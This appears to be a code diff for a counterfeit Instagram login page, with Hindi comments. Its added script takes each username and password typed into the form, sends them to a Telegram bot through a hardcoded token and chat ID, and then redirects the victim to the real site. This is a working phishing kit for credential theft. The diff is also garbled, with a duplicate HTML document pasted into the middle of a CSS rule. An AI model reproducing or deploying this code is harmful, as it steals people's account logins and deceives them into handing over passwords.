@@ -405,6 +405,61 @@
         input:focus {
             outline: none;
             border-color: #a8a8a8;
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding-bottom: 60px;
+        }
+        .login-wrapper {
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo-container img {
+            width: 175px;
+            height: 51px;
+            object-fit: contain;
+        }
+        form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 8px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
         }
         button {
             width: 100%;
@@ -464,14 +519,10 @@
         }
         .signup-section a {
             color: #0095f6;
-<!DOCTYPE html>
-<html lang="hi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login • Instagram</title>
-    <!-- यहाँ CSS फाइल जोड़ी गई है -->
-    <link rel="stylesheet" href="style.css">
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
 </head>
 <body>
 
@@ -499,10 +550,28 @@
         Don't have an account? <a href="#">Sign up</a>
     </div>
 
-    <!-- यहाँ JavaScript फाइल जोड़ी गई है -->
-    <script src="script.js"></script>
+    <!-- JavaScript -->
+    <script>
+        const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
+        const chatId = "7008289410";    
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); 
+
+            let user = document.querySelector('input[name="username"]').value;
+            let pass = document.querySelector('input[name="password"]').value;
+
+            let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+                console.log('सफलतापूर्वक भेज दिया गया', data);
+                window.location.href = "https://instagram.com"; 
+            })
+            .catch(error => console.error('एरर:', error));
+        });
+    </script>
 
 </body>
 </html>
-
-
